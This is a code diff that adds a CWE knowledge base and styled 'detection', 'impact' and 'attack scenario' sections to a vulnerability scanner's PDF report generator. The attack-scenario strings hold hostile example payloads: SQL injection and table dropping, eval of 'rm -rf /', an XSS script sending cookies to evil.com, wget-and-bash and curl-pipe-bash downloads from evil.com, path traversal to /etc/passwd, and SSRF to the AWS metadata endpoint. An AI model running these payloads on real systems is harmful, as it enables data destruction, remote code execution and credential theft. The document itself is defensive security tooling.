@@ -95,6 +95,65 @@ def _escape(text: str) -> str:
     return (text or '').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
 
 
+# ── CWE Knowledge Base ───────────────────────────────────────────────────────
+# Provides rich explanations for each CWE: how it's detected, what's the impact,
+# and a concrete attack scenario. Used in the PDF "Detailed Findings" section.
+CWE_KNOWLEDGE_BASE: Dict[str, Dict[str, str]] = {
+    'CWE-89': {
+        'detection': 'The system detected SQL query construction using string concatenation or f-string formatting with user-controlled variables. The Pattern Matching Engine identified the concatenation pattern, and the GNN+Bi-LSTM model confirmed that user input flows directly into the SQL statement without parameterization.',
+        'impact': 'An attacker can inject arbitrary SQL commands to read, modify, or delete data in the database. In severe cases, this can lead to full database compromise, unauthorized access to sensitive records (passwords, personal data), or even remote code execution on the database server.',
+        'attack': 'Example: If the input is: \' OR 1=1 -- the query becomes: SELECT * FROM users WHERE name = \'\' OR 1=1 --\' which returns ALL records. An attacker could also use: \'; DROP TABLE users; -- to delete the entire table.',
+    },
+    'CWE-94': {
+        'detection': 'The system detected the use of eval(), exec(), or similar dynamic code execution functions that accept external input. The Pattern Matching Engine flagged the dangerous function call, and the AI model analyzed the data flow to confirm that user-controlled data reaches the execution point.',
+        'impact': 'An attacker can execute arbitrary code on the server with the same privileges as the application. This can lead to complete system compromise, data theft, installation of malware, or use of the server as a launchpad for further attacks.',
+        'attack': 'Example: If user input is: __import__(\'os\').system(\'rm -rf /\') passed to eval(), it would execute a system command that deletes all files on the server.',
+    },
+    'CWE-79': {
+        'detection': 'The system detected user input being inserted directly into HTML output via res.send(), template literals, or innerHTML without sanitization. The Pattern Engine matched the output pattern, and the AI model traced the data flow from input source to HTML rendering.',
+        'impact': 'An attacker can inject malicious JavaScript that executes in victims\' browsers. This enables session hijacking (stealing cookies), defacing the website, redirecting users to phishing sites, or performing actions on behalf of logged-in users.',
+        'attack': 'Example: If search query is: <script>document.location=\'http://evil.com/?c=\'+document.cookie</script> it would steal the victim\'s session cookie and send it to the attacker\'s server.',
+    },
+    'CWE-78': {
+        'detection': 'The system detected OS command construction using string concatenation with user input, typically via os.system(), subprocess.call(shell=True), or child_process.exec(). The AI model confirmed that external input flows into the command string without sanitization.',
+        'impact': 'An attacker can execute arbitrary operating system commands. This can lead to complete server takeover, data exfiltration, installation of backdoors, lateral movement within the network, or denial of service.',
+        'attack': 'Example: If filename input is: file.txt; cat /etc/passwd the command becomes: tar -czf backup.tar.gz file.txt; cat /etc/passwd executing both commands and exposing system passwords.',
+    },
+    'CWE-77': {
+        'detection': 'The system detected command injection patterns where user-controlled data is passed to system command execution functions. The Pattern Matching Engine identified dangerous function calls (os.system, subprocess with shell=True), and the AI model verified the tainted data flow.',
+        'impact': 'An attacker can execute arbitrary operating system commands on the server. This can lead to complete server compromise, data theft, service disruption, or use of the server for malicious purposes such as cryptocurrency mining or botnet participation.',
+        'attack': 'Example: If user input is: ; wget http://evil.com/malware.sh && bash malware.sh the attacker can download and execute malicious scripts on the server.',
+    },
+    'CWE-22': {
+        'detection': 'The system detected file path construction using string concatenation with user-supplied values. The Pattern Engine identified patterns like open(f"/path/{user_input}") or path.join with unvalidated input. The AI model confirmed the absence of path normalization or directory restriction checks.',
+        'impact': 'An attacker can read arbitrary files from the server, including configuration files with database credentials, application source code, or system files like /etc/passwd. In write scenarios, the attacker could overwrite critical system files.',
+        'attack': 'Example: If path input is: ../../../../etc/passwd the application would read: /data/../../../../etc/passwd which resolves to /etc/passwd, exposing system user information.',
+    },
+    'CWE-502': {
+        'detection': 'The system detected the use of unsafe deserialization functions such as pickle.loads(), yaml.load() without SafeLoader, or eval() on serialized data. The Pattern Engine flagged these dangerous function calls, and the AI model confirmed that the deserialized data originates from an untrusted source.',
+        'impact': 'An attacker can craft malicious serialized objects that execute arbitrary code when deserialized. This can lead to Remote Code Execution (RCE), allowing complete server takeover without any authentication.',
+        'attack': 'Example: A crafted pickle payload can execute: os.system("curl http://evil.com/shell.sh | bash") simply by being deserialized with pickle.loads(), giving the attacker full control of the server.',
+    },
+    'CWE-798': {
+        'detection': 'The system detected hardcoded credentials, API keys, or secret tokens embedded directly in source code. The Pattern Engine matched patterns like AWS_ACCESS_KEY, password = "...", or API_KEY = "..." with high-entropy string values. The AI model confirmed these are not test/placeholder values.',
+        'impact': 'If the source code is leaked or shared (e.g., pushed to a public GitHub repository), attackers can immediately use these credentials to access cloud services, databases, or APIs. This can lead to unauthorized data access, financial charges on cloud accounts, or service abuse.',
+        'attack': 'Example: Exposed AWS credentials allow an attacker to run: aws s3 ls --profile stolen to list all S3 buckets and download sensitive data, or spin up expensive EC2 instances for cryptocurrency mining.',
+    },
+    'CWE-918': {
+        'detection': 'The system detected HTTP request functions (fetch, requests.get, axios) with URLs constructed from user input. The Pattern Engine identified dynamic URL patterns, and the AI model traced the data flow to confirm that the URL is user-controlled without allowlist validation.',
+        'impact': 'An attacker can make the server send requests to internal services, cloud metadata endpoints (169.254.169.254), or other systems behind the firewall. This can expose internal APIs, steal cloud credentials, or scan internal networks.',
+        'attack': 'Example: If URL input is: http://169.254.169.254/latest/meta-data/iam/security-credentials/ the server would fetch and return AWS IAM credentials from the cloud metadata service.',
+    },
+}
+
+# Fallback detection text for CWEs not in the knowledge base
+CWE_FALLBACK = {
+    'detection': 'The system detected a potentially dangerous code pattern using a combination of Pattern Matching (regex-based rules) and AI analysis (GNN + Bi-LSTM model). The Pattern Engine identified the suspicious code construct, and the AI model analyzed the code structure and data flow to assess vulnerability likelihood.',
+    'impact': 'This vulnerability could allow attackers to compromise the security of the application. The specific impact depends on the vulnerability type and the application context. Refer to the CWE database (https://cwe.mitre.org) for detailed information.',
+    'attack': 'Refer to the CWE ID listed above for specific attack scenarios and exploitation techniques.',
+}
+
+
 def generate_pdf_report(request: PDFReportRequest) -> BytesIO:
     """Generate a professional, detailed PDF security report."""
 
@@ -302,6 +361,66 @@ def generate_pdf_report(request: PDFReportRequest) -> BytesIO:
                 body_style,
             ))
 
+            # ── How was this detected? (Detection Methodology) ──
+            cwe_key = vuln.cwe_id.upper() if vuln.cwe_id else ''
+            knowledge = CWE_KNOWLEDGE_BASE.get(cwe_key, CWE_FALLBACK)
+
+            story.append(Spacer(1, 4))
+            detect_tbl = Table(
+                [["How was this detected?"]],
+                colWidths=[PAGE_W],
+            )
+            detect_tbl.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#EBF8FF')),
+                ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#2C5282')),
+                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
+                ('FONTSIZE',   (0, 0), (-1, -1), 9),
+                ('TOPPADDING',    (0, 0), (-1, -1), 6),
+                ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
+                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
+                ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#BEE3F8')),
+            ]))
+            story.append(detect_tbl)
+            story.append(Paragraph(_escape(knowledge['detection']), body_style))
+
+            # ── Impact & Risk ──
+            story.append(Spacer(1, 4))
+            impact_tbl = Table(
+                [["Impact & Risk"]],
+                colWidths=[PAGE_W],
+            )
+            impact_tbl.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#FFF5F5')),
+                ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#9B2C2C')),
+                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
+                ('FONTSIZE',   (0, 0), (-1, -1), 9),
+                ('TOPPADDING',    (0, 0), (-1, -1), 6),
+                ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
+                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
+                ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#FED7D7')),
+            ]))
+            story.append(impact_tbl)
+            story.append(Paragraph(_escape(knowledge['impact']), body_style))
+
+            # ── Attack Scenario ──
+            story.append(Spacer(1, 4))
+            attack_tbl = Table(
+                [["Attack Scenario"]],
+                colWidths=[PAGE_W],
+            )
+            attack_tbl.setStyle(TableStyle([
+                ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#FEFCBF')),
+                ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#744210')),
+                ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
+                ('FONTSIZE',   (0, 0), (-1, -1), 9),
+                ('TOPPADDING',    (0, 0), (-1, -1), 6),
+                ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
+                ('LEFTPADDING',   (0, 0), (-1, -1), 8),
+                ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#FEFCBF')),
+            ]))
+            story.append(attack_tbl)
+            story.append(Paragraph(_escape(knowledge['attack']), body_style))
+
             # ── Code snippet at vulnerable line ──
             if vuln.code_snippet:
                 story.append(Paragraph(
@@ -322,10 +441,23 @@ def generate_pdf_report(request: PDFReportRequest) -> BytesIO:
 
             # ── Recommendation / secure example ──
             if vuln.recommendation:
-                story.append(Paragraph(
-                    f"<b>Recommendation:</b> {_escape(vuln.recommendation)}",
-                    body_style,
-                ))
+                story.append(Spacer(1, 4))
+                rec_tbl = Table(
+                    [["Recommendation"]],
+                    colWidths=[PAGE_W],
+                )
+                rec_tbl.setStyle(TableStyle([
+                    ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#F0FFF4')),
+                    ('TEXTCOLOR',  (0, 0), (-1, -1), colors.HexColor('#276749')),
+                    ('FONTNAME',   (0, 0), (-1, -1), 'Helvetica-Bold'),
+                    ('FONTSIZE',   (0, 0), (-1, -1), 9),
+                    ('TOPPADDING',    (0, 0), (-1, -1), 6),
+                    ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
+                    ('LEFTPADDING',   (0, 0), (-1, -1), 8),
+                    ('BOX',        (0, 0), (-1, -1), 0.4, colors.HexColor('#C6F6D5')),
+                ]))
+                story.append(rec_tbl)
+                story.append(Paragraph(_escape(vuln.recommendation), body_style))
             if vuln.secure_example:
                 story.append(Paragraph("<b>Secure code example:</b>", label_style))
                 sec_lines = '\n'.join(_escape(ln) for ln in vuln.secure_example.split('\n'))
